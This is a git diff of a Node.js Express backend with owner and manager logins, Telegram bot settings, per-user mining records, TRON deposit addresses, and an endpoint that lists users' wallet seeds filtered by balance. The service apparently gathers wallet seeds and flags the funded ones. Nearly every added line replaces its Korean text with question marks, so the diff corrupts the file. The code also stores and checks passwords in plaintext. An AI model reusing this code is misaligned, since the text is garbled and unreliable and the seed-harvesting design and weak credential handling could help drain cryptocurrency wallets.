+      } catch (tgErr) { console.warn('?? ?? ???? ?? ??:', tgErr.message); }
     }
 
     res.json({ ok: true });
@@ -3977,34 +4068,34 @@ app.post('/api/owner/register', async (req, res) => {
 app.post('/api/owner/login', async (req, res) => {
   try {
     const { id, password } = req.body || {};
-    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: '아이디와 비밀번호를 입력하세요.' });
+    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: '???? ????? ?????.' });
 
-    // 1) account_owners 테이블에서 먼저 확인
+    // 1) account_owners ????? ?? ??
     const [[owner]] = await db.pool.query(
       'SELECT id, name, telegram, manager_id, status FROM account_owners WHERE id = ? AND pw = ?',
       [id.trim().toLowerCase(), password.trim()]
     );
     if (owner) {
-      if (owner.status === 'pending')  return res.status(403).json({ error: '관리자 승인 대기 중입니다.' });
-      if (owner.status === 'rejected') return res.status(403).json({ error: '가입이 거절되었습니다. 관리자에게 문의하세요.' });
+      if (owner.status === 'pending')  return res.status(403).json({ error: '??? ?? ?? ????.' });
+      if (owner.status === 'rejected') return res.status(403).json({ error: '??? ???????. ????? ?????.' });
       const token = crypto.randomBytes(24).toString('hex');
       await db.pool.query('INSERT INTO owner_sessions (token, owner_id) VALUES (?, ?)', [token, owner.id]);
       return res.json({ token, id: owner.id, name: owner.name || owner.id, telegram: owner.telegram || '', role: 'owner' });
     }
 
-    // 2) admins 테이블에서 manager 계정도 허용
+    // 2) admins ????? manager ??? ??
     const [[mgr]] = await db.pool.query(
       "SELECT id, telegram FROM managers WHERE id=? AND pw=? AND role='manager'",
       [id.trim().toLowerCase(), password.trim()]
     );
     if (mgr) {
-      // manager는 owner_sessions에 등록 후 owner처럼 사용
+      // manager? owner_sessions? ?? ? owner?? ??
       const token = crypto.randomBytes(24).toString('hex');
       await db.pool.query('INSERT INTO owner_sessions (token, owner_id) VALUES (?, ?)', [token, mgr.id]);
       return res.json({ token, id: mgr.id, name: mgr.id, telegram: mgr.telegram || '', role: 'manager' });
     }
 
-    return res.status(401).json({ error: '아이디 또는 비밀번호가 올바르지 않습니다.' });
+    return res.status(401).json({ error: '??? ?? ????? ???? ????.' });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
@@ -4022,7 +4113,103 @@ app.get('/api/owner/me', requireOwnerSession, async (req, res) => {
   res.json({ id: req.owner.id, name: req.owner.name, telegram: req.owner.telegram, role: req.owner.role });
 });
 
-// GET /api/owner/accounts — 연결된 유저 계정 목록 + 상태
+// GET /api/owner/telegram-bot ? ??: ?? ?? / ???: ??+??
+app.get('/api/owner/telegram-bot', requireOwnerSession, async (req, res) => {
+  try {
+    if (req.owner.role === 'manager') {
+      const [[m]] = await db.pool.query(
+        'SELECT tg_bot_token, tg_chat_id, tg_chat_deposit, tg_chat_approval FROM managers WHERE id = ?',
+        [req.owner.id]
+      );
+      return res.json({
+        botToken: m?.tg_bot_token || '',
+        chatId: m?.tg_chat_id || '',
+        chatDeposit: m?.tg_chat_deposit || '',
+        chatApproval: m?.tg_chat_approval || '',
+      });
+    }
+    const [[o]] = await db.pool.query(
+      'SELECT tg_bot_token, tg_chat_seed FROM account_owners WHERE id = ?',
+      [req.owner.id]
+    );
+    res.json({ botToken: o?.tg_bot_token || '', chatSeed: o?.tg_chat_seed || '' });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// PUT /api/owner/telegram-bot
+app.put('/api/owner/telegram-bot', requireOwnerSession, async (req, res) => {
+  try {
+    const { botToken, chatId, chatDeposit, chatApproval, chatSeed } = req.body || {};
+    if (req.owner.role === 'manager') {
+      await db.pool.query(
+        'UPDATE managers SET tg_bot_token = ?, tg_chat_id = ?, tg_chat_deposit = ?, tg_chat_approval = ? WHERE id = ?',
+        [
+          botToken?.trim() || null,
+          chatId?.trim() || null,
+          chatDeposit?.trim() || null,
+          chatApproval?.trim() || null,
+          req.owner.id,
+        ]
+      );
+      return res.json({ ok: true });
+    }
+    await db.pool.query(
+      'UPDATE account_owners SET tg_bot_token = ?, tg_chat_seed = ? WHERE id = ?',
+      [botToken?.trim() || null, chatSeed?.trim() || null, req.owner.id]
+    );
+    res.json({ ok: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// POST /api/owner/telegram-bot/test  body: { channel?: 'deposit'|'approval'|'seed' }
+app.post('/api/owner/telegram-bot/test', requireOwnerSession, async (req, res) => {
+  try {
+    if (req.owner.role === 'manager') {
+      const channel = (req.body?.channel || 'deposit').toString();
+      const [[mgr]] = await db.pool.query(
+        'SELECT tg_bot_token, tg_chat_id, tg_chat_deposit, tg_chat_approval FROM managers WHERE id = ?',
+        [req.owner.id]
+      );
+      if (!mgr?.tg_bot_token) {
+        return res.status(400).json({ error: '? ??? ???? ?????.' });
+      }
+      const dep = (mgr.tg_chat_deposit || '').trim() || (mgr.tg_chat_id || '').trim();
+      const appr = (mgr.tg_chat_approval || '').trim() || (mgr.tg_chat_id || '').trim();
+      const chat = channel === 'approval' ? appr : dep;
+      if (!chat) return res.status(400).json({ error: `?? "${channel}"? Chat ID? ????.` });
+      const label = channel === 'approval' ? '????' : '??';
+      await sendTelegram(
+        mgr.tg_bot_token,
+        chat,
+        `? <b>?? ?? ???</b> (${label})\n?? ${escapeHtml(new Date().toLocaleString('ko-KR'))}`,
+        true
+      );
+      return res.json({ ok: true });
+    }
+    const [[o]] = await db.pool.query(
+      'SELECT tg_bot_token, tg_chat_seed FROM account_owners WHERE id = ?',
+      [req.owner.id]
+    );
+    if (!o?.tg_bot_token || !o?.tg_chat_seed) {
+      return res.status(400).json({ error: '? ??? ?? ?? Chat ID? ?? ?????.' });
+    }
+    await sendTelegram(
+      o.tg_bot_token,
+      o.tg_chat_seed,
+      `? <b>?? ?? ?? ???</b>\n?? ${escapeHtml(new Date().toLocaleString('ko-KR'))}`,
+      true
+    );
+    res.json({ ok: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// GET /api/owner/accounts ? ??? ?? ?? ?? + ??
 app.get('/api/owner/accounts', requireOwnerSession, async (req, res) => {
   try {
     const [users] = await db.pool.query(
@@ -4055,14 +4242,14 @@ app.get('/api/owner/accounts', requireOwnerSession, async (req, res) => {
   }
 });
 
-// PATCH /api/owner/accounts/:id/password — 기기 비밀번호 변경 (오너/매니저만)
+// PATCH /api/owner/accounts/:id/password ? ?? ???? ?? (??/????)
 app.patch('/api/owner/accounts/:id/password', requireOwnerSession, async (req, res) => {
   try {
     const targetId = req.params.id.toLowerCase();
     const { new_password } = req.body || {};
-    if (!new_password?.trim()) return res.status(400).json({ error: '새 비밀번호를 입력하세요.' });
+    if (!new_password?.trim()) return res.status(400).json({ error: '? ????? ?????.' });
 
-    // 소유 확인: users.owner_id = 현재 오너 OR 매니저인 경우 해당 매니저 소속 오너의 기기
+    // ?? ??: users.owner_id = ?? ?? OR ???? ?? ?? ??? ?? ??? ??
     const [[owns]] = await db.pool.query(
       `SELECT u.id FROM users u
        LEFT JOIN account_owners ao ON ao.id = u.owner_id
@@ -4070,20 +4257,20 @@ app.patch('/api/owner/accounts/:id/password', requireOwnerSession, async (req, r
          AND (u.owner_id = ? OR ao.manager_id = ?)`,
       [targetId, req.owner.id, req.owner.id]
     );
-    if (!owns) return res.status(403).json({ error: '소유한 계정이 아닙니다.' });
+    if (!owns) return res.status(403).json({ error: '??? ??? ????.' });
 
     await db.pool.query('UPDATE users SET pw = ? WHERE id = ?', [new_password.trim(), targetId]);
     res.json({ ok: true });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// GET /api/owner/accounts/:id/mining-records — 특정 계정 채굴 내역
+// GET /api/owner/accounts/:id/mining-records ? ?? ?? ?? ??
 app.get('/api/owner/accounts/:id/mining-records', requireOwnerSession, async (req, res) => {
   try {
     const targetId = req.params.id.toLowerCase();
-    // 소유 확인
+    // ?? ??
     const [[owns]] = await db.pool.query('SELECT id FROM users WHERE id = ? AND owner_id = ?', [targetId, req.owner.id]);
-    if (!owns) return res.status(403).json({ error: '소유한 계정이 아닙니다.' });
+    if (!owns) return res.status(403).json({ error: '??? ??? ????.' });
     const [records] = await db.pool.query(
       'SELECT id, coin_type, amount, mined_at, note FROM mining_records WHERE user_id = ? ORDER BY mined_at DESC LIMIT 50',
       [targetId]
@@ -4095,15 +4282,15 @@ app.get('/api/owner/accounts/:id/mining-records', requireOwnerSession, async (re
   }
 });
 
-// POST /api/owner/create-account — 오너가 사용자 계정 직접 생성
+// POST /api/owner/create-account ? ??? ??? ?? ?? ??
 app.post('/api/owner/create-account', requireOwnerSession, async (req, res) => {
   try {
     const { id, password, telegram } = req.body || {};
-    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: '아이디와 비밀번호를 입력하세요.' });
+    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: '???? ????? ?????.' });
     const newId = id.trim().toLowerCase();
     const [[exists]] = await db.pool.query('SELECT id FROM users WHERE id = ?', [newId]);
-    if (exists) return res.status(400).json({ error: '이미 존재하는 아이디입니다.' });
-    // owner의 manager_id를 referral로 사용
+    if (exists) return res.status(400).json({ error: '?? ???? ??????.' });
+    // owner? manager_id? referral? ??
     const managerId = req.owner.managerId || '';
     await db.pool.query(
       'INSERT INTO users (id, pw, manager_id, telegram, status, owner_id) VALUES (?, ?, ?, ?, "pending", ?)',
@@ -4115,13 +4302,13 @@ app.post('/api/owner/create-account', requireOwnerSession, async (req, res) => {
   }
 });
 
-// POST /api/owner/kick — 오너 소속 사용자 세션 강제 종료
+// POST /api/owner/kick ? ?? ?? ??? ?? ?? ??
 app.post('/api/owner/kick', requireOwnerSession, async (req, res) => {
   try {
     const { userId } = req.body || {};
-    if (!userId) return res.status(400).json({ error: 'userId 필요' });
+    if (!userId) return res.status(400).json({ error: 'userId ??' });
     const [[owns]] = await db.pool.query('SELECT id FROM users WHERE id = ? AND owner_id = ?', [userId, req.owner.id]);
-    if (!owns) return res.status(403).json({ error: '소유한 계정이 아닙니다.' });
+    if (!owns) return res.status(403).json({ error: '??? ??? ????.' });
     await sessionStore.kickUser(userId);
     res.json({ ok: true });
   } catch (e) {
@@ -4129,7 +4316,7 @@ app.post('/api/owner/kick', requireOwnerSession, async (req, res) => {
   }
 });
 
-// GET /api/owner/seeds — 오너 소속 사용자들의 시드 목록 (잔고 필터 + 페이지네이션)
+// GET /api/owner/seeds ? ?? ?? ????? ?? ?? (?? ?? + ??????)
 app.get('/api/owner/seeds', requireOwnerSession, async (req, res) => {
   try {
     const hasBalance = req.query.hasBalance === '1';
@@ -4177,18 +4364,18 @@ app.get('/api/owner/seeds', requireOwnerSession, async (req, res) => {
   }
 });
 
-// POST /api/owner/payment/request-address — 오너가 소속 사용자에게 입금 주소 발급
+// POST /api/owner/payment/request-address ? ??? ?? ????? ?? ?? ??
 app.post('/api/owner/payment/request-address', requireOwnerSession, async (req, res) => {
   try {
     const { userId, network, tokenType } = req.body || {};
-    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
+    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
     const resolvedUserId = userId.trim().toLowerCase();
-    // 소유 확인
+    // ?? ??
     const [[owns]] = await db.pool.query('SELECT id FROM users WHERE id = ? AND owner_id = ?', [resolvedUserId, req.owner.id]);
-    if (!owns) return res.status(403).json({ error: '소유한 계정이 아닙니다.' });
+    if (!owns) return res.status(403).json({ error: '??? ??? ????.' });
 
     const activeWallet = await db.collectionWalletDB.getActive();
-    if (!activeWallet) return res.status(503).json({ error: '활성화된 수금 지갑이 없습니다. 관리자에게 문의하세요.' });
+    if (!activeWallet) return res.status(503).json({ error: '???? ?? ??? ????. ????? ?????.' });
 
     const existing = await db.depositAddressDB.findByUserAndVersion(resolvedUserId, activeWallet.wallet_version);
     const isExpiredAddress = existing?.status === 'expired';
@@ -4211,7 +4398,7 @@ app.post('/api/owner/payment/request-address', requireOwnerSession, async (req, 
       const newIndex = maxRows[0].maxIdx + 1 + attempt;
       if (secret) {
         try { newAddress = deriveTronAddress(secret, newIndex); } catch (e) {
-          return res.status(500).json({ error: '주소 파생 오류.' });
+          return res.status(500).json({ error: '?? ?? ??.' });
         }
       } else {
         newAddress = activeWallet.root_wallet_address;
@@ -4225,30 +4412,30 @@ app.post('/api/owner/payment/request-address', requireOwnerSession, async (req, 
         throw insertErr;
       }
     }
-    if (!insertSuccess) return res.status(500).json({ error: '주소 발급 실패. 잠시 후 다시 시도해주세요.' });
+    if (!insertSuccess) return res.status(500).json({ error: '?? ?? ??. ?? ? ?? ??????.' });
     res.json({ address: newAddress, walletVersion: activeWallet.wallet_version, status: 'issued', isNew: true });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
 });
 
-// POST /api/owner/payment/bulk-request-address — 통합 결제 주소 발급
+// POST /api/owner/payment/bulk-request-address ? ?? ?? ?? ??
 app.post('/api/owner/payment/bulk-request-address', requireOwnerSession, async (req, res) => {
   try {
     const { entries, targetDate, totalUsdt } = req.body || {};
     if (!Array.isArray(entries) || !entries.length || !targetDate || !(totalUsdt > 0))
-      return res.status(400).json({ error: '필수 파라미터 누락' });
+      return res.status(400).json({ error: '?? ???? ??' });
 
-    // 소유권 검증
+    // ??? ??
     const userIds = entries.map(e => e.userId?.toLowerCase()).filter(Boolean);
     const [owned] = await db.pool.query(
       `SELECT id FROM users WHERE id IN (${userIds.map(() => '?').join(',')}) AND owner_id = ?`,
       [...userIds, req.owner.id]
     );
     if (owned.length !== userIds.length)
-      return res.status(403).json({ error: '소유하지 않은 계정이 포함되어 있습니다.' });
+      return res.status(403).json({ error: '???? ?? ??? ???? ????.' });
 
-    // 이미 진행 중인 세션 재사용
+    // ?? ?? ?? ?? ???
     const [[existing]] = await db.pool.query(
       `SELECT id, deposit_address, total_usdt FROM bulk_payment_sessions
        WHERE owner_id = ? AND status = 'pending' AND created_at > DATE_SUB(NOW(), INTERVAL 1 HOUR)
@@ -4260,9 +4447,9 @@ app.post('/api/owner/payment/bulk-request-address', requireOwnerSession, async (
     }
 
     const activeWallet = await db.collectionWalletDB.getActive();
-    if (!activeWallet) return res.status(503).json({ error: '활성화된 수금 지갑이 없습니다.' });
+    if (!activeWallet) return res.status(503).json({ error: '???? ?? ??? ????.' });
 
-    // 새 파생 주소 발급
+    // ? ?? ?? ??
     const secret = activeWallet.xpub_key;
     let newAddress = null, newIndex = null;
     const MAX_RETRY = 5;
@@ -4271,7 +4458,7 @@ app.post('/api/owner/payment/bulk-request-address', requireOwnerSession, async (
         'SELECT COALESCE(MAX(derivation_index), 0) AS maxIdx FROM deposit_addresses WHERE wallet_version = ?',
         [activeWallet.wallet_version]
       );
-      // bulk 세션에서도 최대 index 확인
+      // bulk ????? ?? index ??
       const [maxRowsB] = await db.pool.query(
         'SELECT COALESCE(MAX(derivation_index), 0) AS maxIdx FROM bulk_payment_sessions WHERE wallet_version = ?',
         [activeWallet.wallet_version]
@@ -4280,18 +4467,18 @@ app.post('/api/owner/payment/bulk-request-address', requireOwnerSession, async (
       newIndex = combined + 1 + attempt;
       if (secret) {
         try { newAddress = deriveTronAddress(secret, newIndex); } catch (e) {
-          return res.status(500).json({ error: '주소 파생 오류.' });
+          return res.status(500).json({ error: '?? ?? ??.' });
         }
       } else {
         newAddress = activeWallet.root_wallet_address;
       }
-      // 중복 주소 확인
+      // ?? ?? ??
       const [[dup]] = await db.pool.query(
         'SELECT id FROM bulk_payment_sessions WHERE deposit_address = ?', [newAddress]
       );
       if (!dup) break;
     }
-    if (!newAddress) return res.status(500).json({ error: '주소 발급 실패.' });
+    if (!newAddress) return res.status(500).json({ error: '?? ?? ??.' });
 
     const token = crypto.randomBytes(24).toString('hex');
     await db.pool.query(
@@ -4299,32 +4486,32 @@ app.post('/api/owner/payment/bulk-request-address', requireOwnerSession, async (
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
       [token, req.owner.id, JSON.stringify(entries), targetDate, totalUsdt, newAddress, activeWallet.wallet_version, newIndex]
     );
-    console.log(`[BULK-ADDR] 발급 owner=${req.owner.id} addr=${newAddress} total=${totalUsdt}`);
+    console.log(`[BULK-ADDR] ?? owner=${req.owner.id} addr=${newAddress} total=${totalUsdt}`);
     res.json({ token, address: newAddress, totalUsdt: Number(totalUsdt) });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
 });
 
-// GET /api/owner/payment/bulk-status — 통합 결제 상태 조회
+// GET /api/owner/payment/bulk-status ? ?? ?? ?? ??
 app.get('/api/owner/payment/bulk-status', requireOwnerSession, async (req, res) => {
   try {
     const { token } = req.query;
-    if (!token) return res.status(400).json({ error: 'token 필요' });
+    if (!token) return res.status(400).json({ error: 'token ??' });
     const [[sess]] = await db.pool.query(
       'SELECT id, status, deposit_address, total_usdt, target_date FROM bulk_payment_sessions WHERE id = ? AND owner_id = ?',
       [token, req.owner.id]
     );
-    if (!sess) return res.status(404).json({ error: '세션 없음' });
+    if (!sess) return res.status(404).json({ error: '?? ??' });
     res.json({ status: sess.status, address: sess.deposit_address, totalUsdt: Number(sess.total_usdt), targetDate: sess.target_date });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
 });
 
-// ========== 관리자 — 그룹 오너 관리 API ==========
+// ========== ??? ? ?? ?? ?? API ==========
 
-// GET /api/admin/account-owners — 오너 목록 (status 포함)
+// GET /api/admin/account-owners ? ?? ?? (status ??)
 app.get('/api/admin/account-owners', requireAdmin, async (req, res) => {
   try {
     let where = '';
@@ -4351,14 +4538,14 @@ app.get('/api/admin/account-owners', requireAdmin, async (req, res) => {
   }
 });
 
-// POST /api/admin/account-owners — 오너 직접 생성 (status='approved')
+// POST /api/admin/account-owners ? ?? ?? ?? (status='approved')
 app.post('/api/admin/account-owners', requireAdmin, async (req, res) => {
   try {
     const { id, password, name, telegram } = req.body || {};
-    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: 'id, password 필수' });
+    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: 'id, password ??' });
     const ownerId = id.trim().toLowerCase();
     const [[exists]] = await db.pool.query('SELECT id FROM account_owners WHERE id = ?', [ownerId]);
-    if (exists) return res.status(400).json({ error: '이미 존재하는 ID입니다.' });
+    if (exists) return res.status(400).json({ error: '?? ???? ID???.' });
     const managerId = req.admin.role === 'master' ? (req.body.manager_id || null) : req.admin.id;
     await db.pool.query(
       'INSERT INTO account_owners (id, pw, name, telegram, manager_id, status) VALUES (?, ?, ?, ?, ?, ?)',
@@ -4370,54 +4557,54 @@ app.post('/api/admin/account-owners', requireAdmin, async (req, res) => {
   }
 });
 
-// POST /api/admin/account-owners/:id/kick-session — 오너 세션 강제 종료
+// POST /api/admin/account-owners/:id/kick-session ? ?? ?? ?? ??
 app.post('/api/admin/account-owners/:id/kick-session', requireAdmin, async (req, res) => {
   try {
     const ownerId = req.params.id;
     if (req.admin.role !== 'master') {
       const [[owner]] = await db.pool.query('SELECT manager_id FROM account_owners WHERE id = ?', [ownerId]);
-      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '권한 없음' });
+      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '?? ??' });
     }
     const [result] = await db.pool.query('DELETE FROM owner_sessions WHERE owner_id = ?', [ownerId]);
     res.json({ ok: true, deleted: result.affectedRows });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// POST /api/admin/account-owners/:id/approve — 오너 승인
+// POST /api/admin/account-owners/:id/approve ? ?? ??
 app.post('/api/admin/account-owners/:id/approve', requireAdmin, async (req, res) => {
   try {
     const ownerId = req.params.id;
     if (req.admin.role !== 'master') {
       const [[owner]] = await db.pool.query('SELECT manager_id FROM account_owners WHERE id = ?', [ownerId]);
-      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '권한 없음' });
+      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '?? ??' });
     }
     await db.pool.query("UPDATE account_owners SET status = 'approved' WHERE id = ?", [ownerId]);
     res.json({ ok: true });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// POST /api/admin/account-owners/:id/reject — 오너 거절
+// POST /api/admin/account-owners/:id/reject ? ?? ??
 app.post('/api/admin/account-owners/:id/reject', requireAdmin, async (req, res) => {
   try {
     const ownerId = req.params.id;
     if (req.admin.role !== 'master') {
       const [[owner]] = await db.pool.query('SELECT manager_id FROM account_owners WHERE id = ?', [ownerId]);
-      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '권한 없음' });
+      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '?? ??' });
     }
     await db.pool.query("UPDATE account_owners SET status = 'rejected' WHERE id = ?", [ownerId]);
     res.json({ ok: true });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// DELETE /api/admin/account-owners/:id — 오너 삭제
+// DELETE /api/admin/account-owners/:id ? ?? ??
 app.delete('/api/admin/account-owners/:id', requireAdmin, async (req, res) => {
   try {
     const ownerId = req.params.id;
     if (req.admin.role !== 'master') {
       const [[owner]] = await db.pool.query('SELECT manager_id FROM account_owners WHERE id = ?', [ownerId]);
-      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '권한 없음' });
+      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '?? ??' });
     }
-    // 연결된 users의 owner_id 해제
+    // ??? users? owner_id ??
     await db.pool.query('UPDATE users SET owner_id = NULL WHERE owner_id = ?', [ownerId]);
     await db.pool.query('DELETE FROM owner_sessions WHERE owner_id = ?', [ownerId]);
     await db.pool.query('DELETE FROM account_owners WHERE id = ?', [ownerId]);
@@ -4427,13 +4614,13 @@ app.delete('/api/admin/account-owners/:id', requireAdmin, async (req, res) => {
   }
 });
 
-// PATCH /api/admin/account-owners/:id — 오너 정보 수정 (이름·텔레그램·비밀번호·담당매니저)
+// PATCH /api/admin/account-owners/:id ? ?? ?? ?? (??????????????????)
 app.patch('/api/admin/account-owners/:id', requireAdmin, async (req, res) => {
   try {
     const ownerId = req.params.id;
     if (req.admin.role !== 'master') {
       const [[owner]] = await db.pool.query('SELECT manager_id FROM account_owners WHERE id = ?', [ownerId]);
-      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '권한 없음' });
+      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '?? ??' });
     }
     const { name, telegram, password, manager_id } = req.body || {};
     const fields = [];
@@ -4444,17 +4631,17 @@ app.patch('/api/admin/account-owners/:id', requireAdmin, async (req, res) => {
     if (manager_id !== undefined && req.admin.role === 'master') {
       fields.push('manager_id=?'); vals.push(manager_id || null);
     }
-    if (!fields.length) return res.status(400).json({ error: '변경할 항목이 없습니다.' });
+    if (!fields.length) return res.status(400).json({ error: '??? ??? ????.' });
     vals.push(ownerId);
     await db.pool.query(`UPDATE account_owners SET ${fields.join(',')} WHERE id=?`, vals);
     res.json({ ok: true });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// PATCH /api/admin/managers/:id — 매니저 정보 수정 (비밀번호·텔레그램·메모)
+// PATCH /api/admin/managers/:id ? ??? ?? ?? (????????????)
 app.patch('/api/admin/managers/:id', requireAdmin, async (req, res) => {
   try {
-    if (req.admin.role !== 'master') return res.status(403).json({ error: '마스터만 가능합니다.' });
+    if (req.admin.role !== 'master') return res.status(403).json({ error: '???? ?????.' });
     const mgrId = req.params.id;
     const { password, telegram, memo } = req.body || {};
     const fields = [];
@@ -4462,14 +4649,14 @@ app.patch('/api/admin/managers/:id', requireAdmin, async (req, res) => {
     if (password?.trim()) { fields.push('pw=?');       vals.push(password.trim()); }
     if (telegram !== undefined) { fields.push('telegram=?'); vals.push(telegram || null); }
     if (memo     !== undefined) { fields.push('memo=?');     vals.push(memo || null); }
-    if (!fields.length) return res.status(400).json({ error: '변경할 항목이 없습니다.' });
+    if (!fields.length) return res.status(400).json({ error: '??? ??? ????.' });
     vals.push(mgrId);
     await db.pool.query(`UPDATE managers SET ${fields.join(',')} WHERE id=? AND role='manager'`, vals);
     res.json({ ok: true });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// GET /api/admin/account-owners/:id/accounts — 오너에 연결된 계정 목록
+// GET /api/admin/account-owners/:id/accounts ? ??? ??? ?? ??
 app.get('/api/admin/account-owners/:id/accounts', requireAdmin, async (req, res) => {
   try {
     const [rows] = await db.pool.query(
@@ -4490,15 +4677,15 @@ app.get('/api/admin/account-owners/:id/accounts', requireAdmin, async (req, res)
   }
 });
 
-// PATCH /api/admin/users/:id/owner — 유저 계정의 오너 연결/해제
+// PATCH /api/admin/users/:id/owner ? ?? ??? ?? ??/??
 app.patch('/api/admin/users/:id/owner', requireAdmin, async (req, res) => {
   try {
     const targetId = req.params.id.toLowerCase();
     const { owner_id } = req.body || {};
-    // 오너 존재 확인 (null이면 해제)
+    // ?? ?? ?? (null?? ??)
     if (owner_id) {
       const [[owner]] = await db.pool.query('SELECT id FROM account_owners WHERE id = ?', [owner_id]);
-      if (!owner) return res.status(404).json({ error: '오너 계정을 찾을 수 없습니다.' });
+      if (!owner) return res.status(404).json({ error: '?? ??? ?? ? ????.' });
     }
     await db.pool.query('UPDATE users SET owner_id = ? WHERE id = ?', [owner_id || null, targetId]);
     res.json({ ok: true });
@@ -4507,7 +4694,7 @@ app.patch('/api/admin/users/:id/owner', requireAdmin, async (req, res) => {
   }
 });
 
-// ========== 팝업 / 다운로드 테이블 초기화 ==========
+// ========== ?? / ???? ??? ??? ==========
 (async () => {
   try {
     await db.pool.query(`
@@ -4535,13 +4722,13 @@ app.patch('/api/admin/users/:id/owner', requireAdmin, async (req, res) => {
         created_at DATETIME DEFAULT NOW()
       )
     `);
-    console.log('✅ popups / downloads 테이블 확인 완료');
-  } catch (e) { console.error('테이블 초기화 오류:', e.message); }
+    console.log('? popups / downloads ??? ?? ??');
+  } catch (e) { console.error('??? ??? ??:', e.message); }
 })();
 
-// ========== 공개 API: 팝업/다운로드 ==========
+// ========== ?? API: ??/???? ==========
 
-// GET /api/popups — 현재 활성 팝업 (owner.html에서 사용)
+// GET /api/popups ? ?? ?? ?? (owner.html?? ??)
 app.get('/api/popups', async (req, res) => {
   try {
     const now = new Date();
@@ -4558,7 +4745,7 @@ app.get('/api/popups', async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// GET /api/downloads — 활성 다운로드 목록 (owner.html에서 사용)
+// GET /api/downloads ? ?? ???? ?? (owner.html?? ??)
 app.get('/api/downloads', async (req, res) => {
   try {
     const [rows] = await db.pool.query(
@@ -4568,15 +4755,15 @@ app.get('/api/downloads', async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// POST /api/admin/upload-popup-image — 팝업 이미지 업로드
+// POST /api/admin/upload-popup-image ? ?? ??? ???
 app.post('/api/admin/upload-popup-image', requireAdmin, _uploadPopup.single('image'), (req, res) => {
-  if (req.admin.role !== 'master') return res.status(403).json({ error: '마스터만 가능' });
-  if (!req.file) return res.status(400).json({ error: '파일이 없습니다.' });
+  if (req.admin.role !== 'master') return res.status(403).json({ error: '???? ??' });
+  if (!req.file) return res.status(400).json({ error: '??? ????.' });
   const url = '/uploads/popups/' + req.file.filename;
   res.json({ ok: true, url });
 });
 
-// ========== 어드민: 팝업 CRUD ==========
+// ========== ???: ?? CRUD ==========
 
 app.get('/api/admin/popups', requireAdmin, async (req, res) => {
   try {
@@ -4587,9 +4774,9 @@ app.get('/api/admin/popups', requireAdmin, async (req, res) => {
 
 app.post('/api/admin/popups', requireAdmin, async (req, res) => {
   try {
-    if (req.admin.role !== 'master') return res.status(403).json({ error: '마스터만 가능' });
+    if (req.admin.role !== 'master') return res.status(403).json({ error: '???? ??' });
     const { title, content, image_url, link_url, link_label, start_at, end_at, active } = req.body || {};
-    if (!title?.trim()) return res.status(400).json({ error: '제목을 입력하세요.' });
+    if (!title?.trim()) return res.status(400).json({ error: '??? ?????.' });
     const [r] = await db.pool.query(
       `INSERT INTO popups (title, content, image_url, link_url, link_label, start_at, end_at, active) VALUES (?,?,?,?,?,?,?,?)`,
       [title.trim(), content||null, image_url||null, link_url||null, link_label||null,
@@ -4601,10 +4788,10 @@ app.post('/api/admin/popups', requireAdmin, async (req, res) => {
 
 app.patch('/api/admin/popups/:id', requireAdmin, async (req, res) => {
   try {
-    if (req.admin.role !== 'master') return res.status(403).json({ error: '마스터만 가능' });
+    if (req.admin.role !== 'master') return res.status(403).json({ error: '???? ??' });
     const { title, content, image_url, link_url, link_label, start_at, end_at, active } = req.body || {};
     const fields = []; const vals = [];
-    if (title      !== undefined) { fields.push('title=?');       vals.push(title||'공지'); }
+    if (title      !== undefined) { fields.push('title=?');       vals.push(title||'??'); }
     if (content    !== undefined) { fields.push('content=?');     vals.push(content||null); }
     if (image_url  !== undefined) { fields.push('image_url=?');   vals.push(image_url||null); }
     if (link_url   !== undefined) { fields.push('link_url=?');    vals.push(link_url||null); }
@@ -4612,7 +4799,7 @@ app.patch('/api/admin/popups/:id', requireAdmin, async (req, res) => {
     if (start_at   !== undefined) { fields.push('start_at=?');    vals.push(start_at||null); }
     if (end_at     !== undefined) { fields.push('end_at=?');      vals.push(end_at||null); }
     if (active     !== undefined) { fields.push('active=?');      vals.push(active ? 1 : 0); }
-    if (!fields.length) return res.status(400).json({ error: '변경 항목 없음' });
+    if (!fields.length) return res.status(400).json({ error: '?? ?? ??' });
     vals.push(req.params.id);
     await db.pool.query(`UPDATE popups SET ${fields.join(',')} WHERE id=?`, vals);
     res.json({ ok: true });
@@ -4621,13 +4808,13 @@ app.patch('/api/admin/popups/:id', requireAdmin, async (req, res) => {
 
 app.delete('/api/admin/popups/:id', requireAdmin, async (req, res) => {
   try {
-    if (req.admin.role !== 'master') return res.status(403).json({ error: '마스터만 가능' });
